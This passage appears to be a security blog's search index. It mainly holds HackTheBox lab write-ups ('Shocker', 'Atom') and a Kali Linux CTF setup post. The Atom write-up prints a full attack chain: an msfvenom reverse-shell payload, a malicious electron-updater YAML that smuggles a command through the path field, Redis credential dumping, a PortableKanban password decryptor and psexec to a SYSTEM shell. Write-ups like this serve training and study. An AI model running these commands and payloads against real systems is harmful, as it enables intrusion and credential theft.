SCRIPT_FILENAME=/usr/lib/cgi-bin/iamf.sh REQUEST_URI=/cgi-bin/iamf.sh SCRIPT_NAME=/cgi-bin/iamf.sh HTTP_CONNECTION=close REMOTE_PORT=58222 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin HTTP_IF_NONE_MATCH=\u0026#34;89-559ccac257884-gzip\u0026#34; CONTEXT_PREFIX=/cgi-bin/ PWD=/usr/lib/cgi-bin SERVER_ADMIN=webmaster@localhost REQUEST_SCHEME=http HTTP_IF_MODIFIED_SINCE=Fri, 22 Sep 2017 20:01:19 GMT HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5 HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 REMOTE_ADDR=10.10.14.83 SHLVL=1 SERVER_NAME=10.10.10.56 CONTENT_LENGTH=0 SERVER_SOFTWARE=Apache/2.4.18 (Ubuntu) QUERY_STRING= SERVER_ADDR=10.10.10.56 GATEWAY_INTERFACE=CGI/1.1 HTTP_UPGRADE_INSECURE_REQUESTS=1 SERVER_PROTOCOL=HTTP/1.1 HTTP_CACHE_CONTROL=max-age=0 HTTP_ACCEPT_ENCODING=gzip, deflate REQUEST_METHOD=GET CONTEXT_DOCUMENT_ROOT=/usr/lib/cgi-bin/ HTTP_IAMF_HEADER=() { : } _=/usr/bin/env  Reference(s)  https://pentesterlab.com/exercises/cve-2014-6271/course https://gtfobins.github.io/gtfobins/perl/#sudo  ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-shocker/","summary":"Shocker is an easy Linux machines from HackTheBox that introduces a vulnerability called Shellshock (CVE-2014-6271). Exploiting this vulnerability results in an unauthenticated remote code execution, which is leveraged to gain a foothold in the system. There is a sudo privilege on perl , and this can leveraged as well to gain root shell.\nIn the end of this write-up, I\u0026rsquo;ll see how the Shellshock vulnerability works.\nSkills Learned  Exploitation of Shellshock vulnerability Exploitation of sudo privileges on perl  Tools  Nmap Burp Suite Gobuster  Reconnaissance Nmap A full TCP scan discovers two open ports: an Apache web server on port 80 and SSH on port 2222.","tags":["OSCP-like","Linux","Shellshock","CVE-2014-6271","sudo","gtfobins"],"title":"HackTheBox - Shocker"},{"content":"Atom brings a real-life exploitation of a vulnerability in the auto-update feature of Electron-Builder. In Atom, there is a writable SMB share which is used by a company to store an update definition file for QA testing. By leveraging the write access, a malicious update definition can be uploaded there. This malicious update definition points to my reverse shell binary, which results in gaining an interactive shell to the system. Internal enumeration of the system finds a password which can be used to authenticate to a Redis server. I\u0026rsquo;m able to obtain administrator credentials by dumping the Redis database.\nSkills Learned  Exploitation of Electron-Builder app through auto-update. Redis enumeration  Tools  Nmap CrackMapExec Msfvenom Netcat Impacket  Reconnaissance Nmap A full TCP scan with nmap discovers six open ports: HTTP on 80 and its secure version on 443, MSRPC on 135, SMB on 445, WinRM on 5985 and Redis on 6379.\n→ root@kali «atom» «10.10.14.49» $ nmap -p- --max-rate 1000 -sV --reason -oA nmap/10-tcp-allport-atom 10.10.10.237 Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-17 07:56 EDT Nmap scan report for 10.10.10.237 Host is up, received echo-reply ttl 127 (0.051s latency). Not shown: 65529 filtered ports Reason: 65529 no-responses PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack ttl 127 Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27) 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 443/tcp open ssl/http syn-ack ttl 127 Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27) 445/tcp open microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) 5985/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 6379/tcp open redis syn-ack ttl 127 Redis key-value store Service Info: Host: ATOM; OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 153.92 seconds A script scan doesn\u0026rsquo;t really helpful, so I\u0026rsquo;ll skip that here.\nEnumeration TCP 6379 - Redis On Redis, authenticated is required.\n→ root@kali «smb» «10.10.14.49» $ nc -nv 10.10.10.237 6379 (UNKNOWN) [10.10.10.237] 6379 (?) open INFO -NOAUTH Authentication required. TCP 445 - SMB SMB enumeration with Anonymous logon using crackmapexec reveals the Windows version and one writable share.\n→ root@kali «atom» «10.10.14.49» $ crackmapexec smb 10.10.10.237 -u \u0026#39;ANONYMOUS\u0026#39; -p \u0026#39;\u0026#39; --shares SMB 10.10.10.237 445 ATOM [*] Windows 10 Pro 19042 x64 (name:ATOM) (domain:ATOM) (signing:False) (SMBv1:True) SMB 10.10.10.237 445 ATOM [+] ATOM\\ANONYMOUS: SMB 10.10.10.237 445 ATOM [+] Enumerated shares SMB 10.10.10.237 445 ATOM Share Permissions Remark SMB 10.10.10.237 445 ATOM ----- ----------- ------ SMB 10.10.10.237 445 ATOM ADMIN$ Remote Admin SMB 10.10.10.237 445 ATOM C$ Default share SMB 10.10.10.237 445 ATOM IPC$ Remote IPC SMB 10.10.10.237 445 ATOM Software_Updates READ,WRITE Software_Updates Share In Software_Updates, there is a PDF file called UAT_Testing_Procedures.pdf. I\u0026rsquo;ll grab that file.\n→ root@kali «atom» «10.10.14.49» $ smbclient -N //10.10.10.237/Software_Updates Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; dir . D 0 Mon May 17 08:05:58 2021 .. D 0 Mon May 17 08:05:58 2021 client1 D 0 Mon May 17 08:05:58 2021 client2 D 0 Mon May 17 08:05:58 2021 client3 D 0 Mon May 17 08:05:58 2021 UAT_Testing_Procedures.pdf A 35202 Fri Apr 9 07:18:08 2021 4413951 blocks of size 4096. 1361569 blocks available smb: \\\u0026gt; recurse on smb: \\\u0026gt; prompt off smb: \\\u0026gt; mget * getting file \\UAT_Testing_Procedures.pdf of size 35202 as UAT_Testing_Procedures.pdf (121.5 KiloBytes/sec) (average 121.5 KiloBytes/sec) TCP 80,443 - Website Both port 80 and 443 are displaying a software company site called \u0026ldquo;Heed Solutions\u0026rdquo;.\nAt the bottom, there is a hostname and a download link that points to http://10.10.10.237/releases/heed_setup_v1.0.0.zip.\nI\u0026rsquo;ll add the hostname to my /etc/hosts file and then download the previous software.\n→ root@kali «atom» «10.10.14.49» $ echo \u0026#39;10.10.10.237 atom.htb\u0026#39; \u0026gt;\u0026gt; /etc/hosts After the hostname added, the site still shows the same content.\n→ root@kali «atom» «10.10.14.49» $ curl -s -k https://10.10.10.237/ | wc -c 7581 → root@kali «atom» «10.10.14.49» $ curl -s -k http://10.10.10.237/ | wc -c 7581 → root@kali «atom» «10.10.14.49» $ curl -s -k http://atom.htb/ | wc -c 7581 → root@kali «atom» «10.10.14.49» $ curl -s -k https://atom.htb/ | wc -c 7581 Analysis The previous zip file contains one executable file called heedv1 Setup 1.0.0.exe.\n→ root@kali «loot» «10.10.14.49» $ file heedv1_setup_1.0.0.exe heedv1_setup_1.0.0.exe: PE32 executable (GUI) Intel 80386, for MS Windows, Nullsoft Installer self-extracting archive It says \u0026ldquo;self-extracting archive\u0026rdquo;, meaning it can be extracted, for example using 7z.\nWhile looking into the app structure, I spotted a file called app-update.yml.\n→ root@kali «heed_extracted» «10.10.14.49» $ tree . ├── $PLUGINSDIR │ ├── app-64 ...\u0026lt;SNIP\u0026gt;... │ │ ├── natives_blob.bin │ │ ├── resources │ │ │ ├── app.asar │ │ │ ├── app-update.yml # ==\u0026gt; Updater config │ │ │ ├── electron.asar │ │ │ ├── elevate.exe │ │ │ └── inspector ...\u0026lt;SNIP\u0026gt;... 73 directories, 274 files The file contains another hostname, which I\u0026rsquo;ll add it to /etc/hosts.\n→ root@kali «heed_extracted» «10.10.14.49» $ cat ./\\$PLUGINSDIR/app-64/resources/app-update.yml provider: generic url: \u0026#39;http://updates.atom.htb\u0026#39; publisherName: - HackTheBox And again, it is the same site.\n→ root@kali «heed_extracted» «10.10.14.49» $ curl -s http://updates.atom.htb/ | wc -c 7581 Guessing based on the content of UAT_Testing_Procedures.pdf file from SMB enumeration, heedv1_setup_1.0.0.exe  is currently on testing phase. Other information that I can obtain are:\n The app is packed with electron-builder The app has auto-update feature, but before releasing the updated app, the QA team will test it first.  According to the image above, the client folder here probably refers to the ones on SMB.\nFoothold Shell as Jason RCE Electron-Updater - Background I went to the rabbit hole by analyzing the executable file. At first, I thought I could inject the app-update.yml to point to my malicious .exe file and repack the app. I got the idea of poisoning the update file but didn\u0026rsquo;t know where to start until I found this blog.\nAccording to that blog, during a software update, previous Electron-Updater uses the following line to perform a signature verification check on the new version of binary file.\nexecFile(\u0026#34;powershell.exe\u0026#34;, [\u0026#34;-NoProfile\u0026#34;, \u0026#34;-NonInteractive\u0026#34;, \u0026#34;-InputFormat\u0026#34;, \u0026#34;None\u0026#34;, \u0026#34;-Command\u0026#34;, `Get-AuthenticodeSignature \u0026#39;${tempUpdateFile}\u0026#39; | ConvertTo-Json -Compress`], { ...\u0026lt;SNIP\u0026gt;... If ${tempUpdateFile} is a user-controlled input, this can be leveraged for command injection: ';calc;'\n Since the ${tempUpdateFile} variable is provided unescaped to the execFile utility, an attacker could bypass the entire signature verification by triggering a parse error in the script.\n The following is an example of malicious update definition that will pop a calculator.\nversion: 2.0.0 path: u\u0026#39;;calc;\u0026#39;pdate.exe sha512: qwP35Rn5PLaBoZ8tzvRFK...\u0026lt;SNIP\u0026gt;...LM3WCmvJUXMYmZGW6T+fI= releaseDate: \u0026#39;2021-01-24T13:44:59.064Z\u0026#39; Sending this u';payload;'pdate.exe as path would be troublesome, which is simplified as follows:\n`Get-AuthenticodeSignature \u0026#39;u\u0026#39;;payload;\u0026#39;pdate.exe\u0026#39; | ConvertTo-Json -Compress` Now that if a single quote ' is added to path, it becomes:\n`Get-AuthenticodeSignature \u0026#39;u\u0026#39;pdate.exe\u0026#39; | ConvertTo-Json -Compress` But then, the line above would breaks the signature verification.\nAnd here\u0026rsquo;s come the interesting part, an attacker could easily bypass this signature verification by recalculating the hash of u'pdate.exe. That\u0026rsquo;s very clever, right?\nRCE Electron-Updater - Exploitation According to the SMB enumeration, all the client folders are writable, which means exploitation can be done in two ways: local and remote. But, I\u0026rsquo;ll go with remote 😅.\nFirst, I\u0026rsquo;ll have to generate a reverse shell binary. This can be done with msfvenom. I\u0026rsquo;ll host this binary using Python web server afterwards.\n→ root@kali «exploits» «10.10.14.49» $ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.49 LPORT=53 -f exe -o i\\\u0026#39;amf.exe [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder or badchars specified, outputting raw payload Payload size: 460 bytes Final size of exe file: 7168 bytes Saved as: i\u0026#39;amf.exe Next, I\u0026rsquo;ll need to calculate the hash of i'amf.exe using the following command:\n→ root@kali «exploits» «10.10.14.49» $ shasum -a 512 i\\\u0026#39;amf.exe | cut -d \u0026#39; \u0026#39; -f1 | xxd -r -p | base64 | tr -d \u0026#39;\\n\u0026#39; Y4xekmQ80+ALOD0xXBgPdaOmgSsbK8jACQ6xmF4ndoEOvleyI4HRTDniVdExVNryCPWGgxOElKPhMyJCywuLtw== The last thing I need is the update file. I\u0026rsquo;ll create one called update-iamf.yml which contains the following update definitions:\nversion:2.0.1path:http://10.10.14.83/i\u0026#39;amf.exesha512:Y4xekmQ80+ALOD0xXBgPdaOmgSsbK8jACQ6xmF4ndoEOvleyI4HRTDniVdExVNryCPWGgxOElKPhMyJCywuLtw==releaseDate:\u0026#39;2021-01-24T13:44:59.064Z\u0026#39;I\u0026rsquo;ll upload the update file to Software_Updates share using smbclient and start a netcat listener. After a few minutes, the reverse shell binary connected to my listener.\n→ root@kali «exploits» «10.10.14.49» $ smbclient -N //10.10.10.237/Software_Updates -c \u0026#34;put iamf-update.yml client1/latest.yml\u0026#34; \u0026amp;\u0026amp; nc -nvlp 53 putting file iamf-update.yml as \\client1\\latest.yml (1.1 kb/s) (average 1.1 kb/s) listening on [any] 53 ... connect to [10.10.14.49] from (UNKNOWN) [10.10.10.237] 64352 Microsoft Windows [Version 10.0.19042.906] (c) Microsoft Corporation. All rights reserved. C:\\WINDOWS\\system32\u0026gt;whoami whoami atom\\jason C:\\WINDOWS\\system32\u0026gt; User flag is done here.\nC:\\Users\\jason\\Desktop\u0026gt;type user.txt type user.txt b77e754354e186f...\u0026lt;SNIP\u0026gt;... Privilege Escalation Shell as SYSTEM Internal Enumeration WinPEAS discovers a set of credentials for user jason.\n...\u0026lt;SNIP\u0026gt;... [+] Checking Credential manager [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault [!] Warning: if password contains non-printable characters, it will be printed as unicode base64 encoded string Username: ATOM\\jason Password: kidvscat_electron_@123 Target: ATOM\\jason PersistenceType: Enterprise LastWriteTime: 3/31/2021 2:53:49 AM On Jason\u0026rsquo;s download directory, there is a PortableKanban folder. PortableKanban itself is a password manager. I have familiarity with this application from HTB Sharp (I\u0026rsquo;ve not been able to pwn it, though 😂). Its config contains encrypted Redis database password (The clear password revealed in the next section).\nC:\\Users\\jason\\Downloads\u0026gt;type PortableKanban\\PortableKanban.cfg type PortableKanban\\PortableKanban.cfg {\u0026#34;RoamingSettings\u0026#34;:{\u0026#34;DataSource\u0026#34;:\u0026#34;RedisServer\u0026#34;,\u0026#34;DbServer\u0026#34;:\u0026#34;localhost\u0026#34;,\u0026#34;DbPort\u0026#34;:6379,\u0026#34;DbEncPassword\u0026#34;:\u0026#34;Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb\u0026#34; ...\u0026lt;SNIP\u0026gt;... Redis Revisited Looking into the Redis installation folder, I find a plain password in redis.windows.conf file.\nC:\\Program Files\\Redis\u0026gt;type redis.windows.conf | findstr requirepass type redis.windows.conf | findstr requirepass requirepass kidvscat_yes_kidvscat redis.windows-service.conf also contains the same password.\nC:\\Program Files\\Redis\u0026gt;type redis.windows-service.conf | findstr requirepass type redis.windows-service.conf | findstr requirepass requirepass kidvscat_yes_kidvscat The password kidvscat_yes_kidvscat works on Redis.\n→ root@kali «atom» «10.10.14.49» $ rlwrap nc -nv 10.10.10.237 6379 (UNKNOWN) [10.10.10.237] 6379 (redis) open AUTH jason kidvscat_electron_@123 -ERR wrong number of arguments for \u0026#39;auth\u0026#39; command AUTH kidvscat_electron_@123 -ERR invalid password AUTH kidvscat_yes_kidvscat +OK It\u0026rsquo;s possible to dump the database that is currently in use.\nTo do that, I\u0026rsquo;ll send INFO command and starting to look for a chunk called Keyspace .\nINFO $1938 # Server redis_version:3.0.504 ...\u0026lt;SNIP\u0026gt;... # Keyspace db0:keys=4,expires=0,avg_ttl=0 There is one database active, which is db0 and it contains 4 keys.\nI\u0026rsquo;ll send KEYS * command to get all the stored keys.\nSELECT 0 +OK KEYS * *4 $48 pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0 $11 pk:ids:User $20 pk:ids:MetaDataClass $57 pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff The value of pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0 contains a credentials of the Administrator account, but the password is encrypted.\nGET pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0 $207 {\u0026#34;Id\u0026#34;:\u0026#34;e8e29158d70d44b1a1ba4949d52790a0\u0026#34;,\u0026#34;Name\u0026#34;:\u0026#34;Administrator\u0026#34;,\u0026#34;Initials\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;Email\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;EncryptedPassword\u0026#34;:\u0026#34;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi\u0026#34;,\u0026#34;Role\u0026#34;:\u0026#34;Admin\u0026#34;,\u0026#34;Inactive\u0026#34;:false,\u0026#34;TimeStamp\u0026#34;:637530169606440253} PortableKanban Decrypt By assuming that the password is encrypted using PortableKanban, I could try to decrypt the password I obtained using the following script (a modified version of the original exploit).\nfrom base64 import b64decode import sys import des key = des.DesKey(b\u0026#39;7ly6UznJ\u0026#39;) iv = b\u0026#39;XuVUm5fR\u0026#39; try: passwd = b64decode(sys.argv[1].encode(\u0026#39;UTF-8\u0026#39;)) except IndexError: print(\u0026#39;[-] Usage: %s \u0026lt;base64_encrypted_passwd\u0026gt;\u0026#39; % sys.argv[0]) sys.exit(-1) dec_password = key.decrypt(passwd, initial=iv, padding=True) print(\u0026#34;[+] Decrypted Password: \u0026#34; + dec_password.decode(\u0026#39;UTF-8\u0026#39;)) The administrator password has been decrypted to kidvscat_admin_@123.\n→ kali@kali «atom» «10.10.14.83» $ python3 pk-decrypt.py Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi [+] Decrypted Password: kidvscat_admin_@123 psexec.py I could use the credentials in psexec from impacket to obtain interactive shell access as system.\n→ root@kali «atom» «10.10.14.49» $ impacket-psexec atom/administrator:\u0026#39;kidvscat_admin_@123\u0026#39;@10.10.10.237 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation [*] Requesting shares on 10.10.10.237..... [*] Found writable share ADMIN$ [*] Uploading file FCSITnEj.exe [*] Opening SVCManager on 10.10.10.237..... [*] Creating service DCLl on 10.10.10.237..... [*] Starting service DCLl..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.19042.906] (c) Microsoft Corporation. All rights reserved. C:\\WINDOWS\\system32\u0026gt;whoami \u0026amp;\u0026amp; hostname nt authority\\system ATOM C:\\WINDOWS\\system32\u0026gt;ipconfig Windows IP Configuration Ethernet adapter Ethernet0: Connection-specific DNS Suffix . : IPv6 Address. . . . . . . . . . . : dead:beef::525:3f10:5c90:26bf Temporary IPv6 Address. . . . . . : dead:beef::cc8a:70e1:ba06:84ed Link-local IPv6 Address . . . . . : fe80::525:3f10:5c90:26bf%6 IPv4 Address. . . . . . . . . . . : 10.10.10.237 Subnet Mask . . . . . . . . . . . : 255.255.255.0 Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%6 10.10.10.2  Reference(s)  https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html https://book.hacktricks.xyz/pentesting/6379-pentesting-redis https://www.exploit-db.com/exploits/49409  ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-atom/","summary":"Atom brings a real-life exploitation of a vulnerability in the auto-update feature of Electron-Builder. In Atom, there is a writable SMB share which is used by a company to store an update definition file for QA testing. By leveraging the write access, a malicious update definition can be uploaded there. This malicious update definition points to my reverse shell binary, which results in gaining an interactive shell to the system. Internal enumeration of the system finds a password which can be used to authenticate to a Redis server.","tags":["OSCP-lik","Windows","Electron-builder","Electron-updater","Command-injection","msfvenom","Redis","PortableKanban","impacket-psexec"],"title":"HackTheBox - Atom"},{"content":"After using Kali 2019.4 for almost 2 years, I finally upgraded my Kali to 2021.2. I wanted to try Parrot or build a weaponized version of Ubuntu , but because I like simplicity, I decided to use Kali again 😄 //slap.\nIn this post, I\u0026rsquo;d like to share my Kali Linux setup for playing HackTheBox. I guess it is applicable for TryHackMe, VulnHub or other boot2root platform, too (I hope).\n[Update 29-07-2021]\n Update sudo alias  Display IP Address in Prompt Adding IP address in your prompt would be really helpful as it lets you copy the IP faster for reverse shell. To do so, we\u0026rsquo;ll need to modify the .zshrc file. But, before performing any modification, consider to make a backup of your original file using the following command:\n$ cp ~/.zshrc{,.bak} Also, I usually put any customization at the top of the .zshrc file wrapped between two comments, for example:\n# START CUSTOM ...[custom script here] # END CUSTOM If all set, add the following function to your .zshrc file.\nfunction get_ip(){ # It can be thm or htb IP tunnel_ip=`ifconfig tun0 2\u0026gt;/dev/null | grep netmask | awk \u0026#39;{print $2}\u0026#39;` # Use eth0 as default IP, default_ip=`ifconfig eth0 2\u0026gt;/dev/null | grep netmask | awk \u0026#39;{print $2}\u0026#39;` if [[ $tunnel_ip == *\u0026#34;10.\u0026#34;* ]]; then echo $tunnel_ip else echo $default_ip fi } Then, find the following lines:\n... case \u0026#34;$PROMPT_ALTERNATIVE\u0026#34; in twoline) ... Under these lines, replace the entire PROMPT variable with the following line:\nPROMPT=$\u0026#39;%F{%(#.blue.green)}┌──${debian_chroot:+($debian_chroot)─}${VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))─}(%B%F{%(#.red.blue)}%n$prompt_symbol%m%b%F{%(#.blue.green)})-[%B%F{reset}%(6~.%-1~/…/%4~.%5~)%b%F{%(#.blue.green)}]-%B%F{152}[`get_ip`]%b%f%F{%(#.blue.green)}\\n└─%B%(#.%F{red}#.%F{blue}$)%b%F{reset} \u0026#39; Reopen your terminal or type one of the following commands in the terminal.\n$ zsh $ source ~/.zshrc And done.\nOpenVPN Connection For VPN, it\u0026rsquo;s tiring when you have to type $ openvpn /path/to/config/file.ovpn each time you want to connect to the HTB/THM network. To make thing easier, we can create a folder called .ovpnconfig in the home directory.\n$ mkdir -p ~/.ovpnconfig Then put all of your OpenVPN configuration files into this .ovpnconfig folder.\nFinally, add some aliases into your .zshrc.\nalias htbon=\u0026#39;openvpn ~/ovpnconfig/htb-sg.ovpn 1\u0026gt;/dev/null \u0026amp;\u0026#39; alias htbfort=\u0026#39;openvpn ~/ovpnconfig/htb-fortress.ovpn 1\u0026gt;/dev/null \u0026amp;\u0026#39; alias htbrel=\u0026#39;openvpn ~/ovpnconfig/htb-release.ovpn 1\u0026gt;/dev/null \u0026amp;\u0026#39; alias thmon=\u0026#39;openvpn ~/ovpnconfig/thm.ovpn 1\u0026gt;/dev/null \u0026amp;\u0026#39; alias thmwreath=\u0026#39;openvpn ~/ovpnconfig/thm-wreath.ovpn 1\u0026gt;/dev/null \u0026amp;\u0026#39; alias kvpn=\u0026#39;pkill openvpn\u0026#39; Now we can type $ htbon or $ thmon in the command prompt to connect to the VPN. Want to turn off the VPN? Simply type $ kvpn !\nSudo with Alias In the newer Kali Linux, the only problem is that openvpn must be executed with sudo . Therefore, you\u0026rsquo;ve to add the following sudo alias.\n# Source: https://askubuntu.com/questions/750419/how-do-i-run-a-sudo-command-needing-password-input-in-the-background alias sudo=\u0026#39;sudo -v; [ $? ] \u0026amp;\u0026amp; sudo \u0026#39;  sudo -v will authenticate the user first. [ $? ] \u0026amp;\u0026amp; sudo  will check if the previous command (separated by semi-colon) return with success (value of 0), if yes run sudo again.  This time, we can run sudo command with aliases.\n$ sudo \u0026lt;alias-command\u0026gt; $ sudo htbon $ sudo thmon $ sudo kvpn An alternative for sudo to work with alias is using sudo with no passwd.\n$ sudo visudo /etc/sudoers.d/kali Then add the following line.\nkali ALL=NOPASSWD: ALL After that, change the previous sudo alias to this one\nalias sudo=\u0026#39;sudo \u0026#39; Tools Transfer Just like the OpenVPN files, I like to keep the essential tools to be centralized in one folder and so it can be hosted immediately. Again, we can create a folder called tools.\n$ mkdir -p ~/tools Put your tools inside the folder. The following are some of the tools that I think to be essential (including web-shell).\nNext, add another alias to host these tools immediately with one command, feel free to create alias for yourself. Mine called hostit.\nalias hostit=\u0026#39;python3 -m http.server -d ~/tools 8000\u0026#39; If you watch ippsec, he prefers keeping the tools with the associated pwned machines (in www directory). So it\u0026rsquo;s up to you.\nNote Template My current note template is available on GitHub. I\u0026rsquo;m using the following function to recreate the directory structure:\nfunction mknote(){ mkdir nmap gobuster loot logs exploits ssh-keys post-exploits }   nmap: each nmap scan goes here.\n  gobuster: each gobuster scan goes here.\n  loot: each interesting file for further analysis goes here.\n  logs: If you like to log your activity with $ script , put them here.\n  exploits: exploit script goes here.\n  ssh-keys: obtained ssh-key goes here, not loot.\n  post-exploits: post-compromise loot goes here.\n  Usage is simple:\n$ cd htb-machine-folder/ $ mknote $ tree . ├── exploits ├── gobuster ├── logs ├── loot ├── nmap ├── post-exploits └── ssh-keys SSH Configuration I have always use a separate SSH keys for CTF. My SSH key for CTF is using ed25519. You can create one using the following command:\n$ ssh-keygen -a 100 -t ed25519 -f ~/.ssh/ctf_ssh After that, register your private key to SSH agent.\n$ eval \u0026#34;$(ssh-agent -s)\u0026#34; $ ssh-add ~/.ssh/ctf_ssh Since HackTheBox machine starts with IP address of 10.10.*, add these lines to your SSH config (~/.ssh/config). Create one if you don\u0026rsquo;t have it.\nHost 10.10.* IdentityFile ~/.ssh/ctf_ssh With the config above, whenever I injected my public key (/.ssh/ctf_ssh.pub) to HackTheBox machine for persistence access*, I can login by simply typing $ ssh machine-name@hostname or $ ssh machine-name@ip. I don\u0026rsquo;t have to specify -i /path/to/ssh/private/key anymore.\n *Read more at Linux Backdoors post.\n QTerminal Configuration Unfortunately I\u0026rsquo;m not a tmux user here. Tmux is rich in features, but I\u0026rsquo;m not comfortable with its prefix key. So far, I\u0026rsquo;ve always used the default QTerminal application and leveraged its shortcut feature to \u0026lsquo;navigate\u0026rsquo; a slightly faster in terminal.\nIf you\u0026rsquo;re a Windows Terminal user, you\u0026rsquo;ll familiar with some of these shortcuts:\n ALT + Arrows: Move cursor in subterminal CTRL + TAB: Navigate between tabs CTRL + Arrow Left: Previous tab CTRL + Arrow Right: Next tab CTRL + N : New terminal tab CTRL + SHIFT + W : Close current subterminal CTRL + SHIFT + = : Split terminal vertically CTRL + SHIFT + - : Split terminal horizontally CTRL + SHIFT + F : Open search bar in terminal CTRL + = : Zoom in CTRL + - : Zoom out  For me, the only limitation here is that there is no shortcut for resizing a subterminal.\nAll in One with Oh My Zsh Plugin If you\u0026rsquo;re a Oh My Zsh user like me, we can add these configurations (excluding SSH and QTerminal configurations) into a custom plugin.\nSave the following script to /home/\u0026lt;username\u0026gt;/.oh-my-zsh/custom/plugins/ctf/ctf.plugin.zsh.\n#!/bin/bash  function get_ip(){ # It can be thm or htb IP tunnel_ip=`ifconfig tun0 2\u0026gt;/dev/null | grep netmask | awk \u0026#39;{print $2}\u0026#39;` # Use eth0 as default IP, default_ip=`ifconfig eth0 2\u0026gt;/dev/null | grep netmask | awk \u0026#39;{print $2}\u0026#39;` if [[ $tunnel_ip == *\u0026#34;10.\u0026#34;* ]]; then echo $tunnel_ip else echo $default_ip fi } function mknote(){ mkdir nmap gobuster loot logs exploits ssh-keys dump post-exploits } # https://askubuntu.com/questions/750419/how-do-i-run-a-sudo-command-needing-password-input-in-the-background alias sudo=\u0026#39;sudo -v; [ $? ] \u0026amp;\u0026amp; sudo \u0026#39; alias htbon=\u0026#39;openvpn ~/ovpnconfig/htb-sg.ovpn 1\u0026gt;/dev/null \u0026amp;\u0026#39; alias htbfort=\u0026#39;openvpn ~/ovpnconfig/htb-fortress.ovpn 1\u0026gt;/dev/null \u0026amp;\u0026#39; alias htbrel=\u0026#39;openvpn ~/ovpnconfig/htb-release.ovpn 1\u0026gt;/dev/null \u0026amp;\u0026#39; alias thmon=\u0026#39;openvpn ~/ovpnconfig/thm.ovpn 1\u0026gt;/dev/null \u0026amp;\u0026#39; alias thmwreath=\u0026#39;openvpn ~/ovpnconfig/thm-wreath.ovpn 1\u0026gt;/dev/null \u0026amp;\u0026#39; alias kvpn=\u0026#39;pkill openvpn\u0026#39; alias hostit=\u0026#39;python3 -m http.server -d ~/tools 8000\u0026#39;  If you want to include my note template as well, I\u0026rsquo;ve prepared this one with note template embedded in mknote function.\n The next step is depending on your theme, I use a theme called robbyrussell. I created a copy of the theme in  /home/kali/.oh-my-zsh/custom/themes/robbyrussell.zsh-theme and modified the theme to display prompt in two line with IP address. The modified version as follows:\nNEWLINE=$\u0026#39;\\n$\u0026#39; PROMPT=\u0026#39;%(?:%{$fg_bold[green]%}→:%{$fg_bold[red]%}→)\u0026#39; PROMPT+=\u0026#39; %F{4}%n@%m %{$fg[cyan]%}«%c»%{$reset_color%}\u0026#39; PROMPT+=\u0026#39; %B%F{152}«$(get_ip)»%f%b $(git_prompt_info)\u0026#39; PROMPT+=\u0026#34;%F{31}${NEWLINE} %f\u0026#34; ZSH_THEME_GIT_PROMPT_PREFIX=\u0026#34;%{$fg_bold[blue]%}git:(%{$fg[red]%}\u0026#34; ZSH_THEME_GIT_PROMPT_SUFFIX=\u0026#34;%{$reset_color%} \u0026#34; ZSH_THEME_GIT_PROMPT_DIRTY=\u0026#34;%{$fg[blue]%}) %{$fg[yellow]%}✗\u0026#34; ZSH_THEME_GIT_PROMPT_CLEAN=\u0026#34;%{$fg[blue]%})\u0026#34; Finally, load the ctf plugin we created in .zshrc file.\n...[SNIP]... # Which plugins would you like to load? # Standard plugins can be found in $ZSH/plugins/ # Custom plugins may be added to $ZSH_CUSTOM/plugins/ # Example format: plugins=(rails git textmate ruby lighthouse) # Add wisely, as too many plugins slow down shell startup. plugins=(git ctf) ...[SNIP]... Restart your terminal and we\u0026rsquo;re done.\nAnd that\u0026rsquo;s all for this post!\nReferences  https://medium.com/risan/upgrade-your-ssh-key-to-ed25519-c6e8d60d3c54 https://askubuntu.com/questions/750419/how-do-i-run-a-sudo-command-needing-password-input-in-the-background  ","permalink":"https://fahmifj.github.io/blog/my-kali-linux-setup-for-playing-hackthebox/","summary":"After using Kali 2019.4 for almost 2 years, I finally upgraded my Kali to 2021.2. I wanted to try Parrot or build a weaponized version of Ubuntu , but because I like simplicity, I decided to use Kali again 😄 //slap.\nIn this post, I\u0026rsquo;d like to share my Kali Linux setup for playing HackTheBox. I guess it is applicable for TryHackMe, VulnHub or other boot2root platform, too (I hope).","tags":["Home-lab","Linux","Kali","nano-blog"],"title":"My Kali Linux Setup for Playing HackTheBox"},{"content":"Last month, I was asked to setup a Samba/SMB server that is accessible over the Internet. Because it will only be used temporarily, I decided to use an Azure Virtual Machine (VM) instead of buying a dedicated VPS.\nIn this post, I’ll share my documentation on how to setup a Samba server in Azure.\nBefore 